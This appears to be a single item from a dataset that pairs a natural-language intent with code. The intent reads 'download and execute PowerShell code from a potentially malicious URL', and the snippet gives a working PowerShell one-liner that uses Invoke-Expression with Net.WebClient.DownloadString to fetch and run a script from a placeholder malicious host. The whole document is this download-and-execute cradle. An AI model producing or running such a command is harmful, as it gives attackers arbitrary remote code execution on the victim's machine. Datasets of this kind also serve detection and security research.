# Natural language intent:
# Download and execute PowerShell code from a potentially malicious URL.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-url.com/malicious.ps1')"
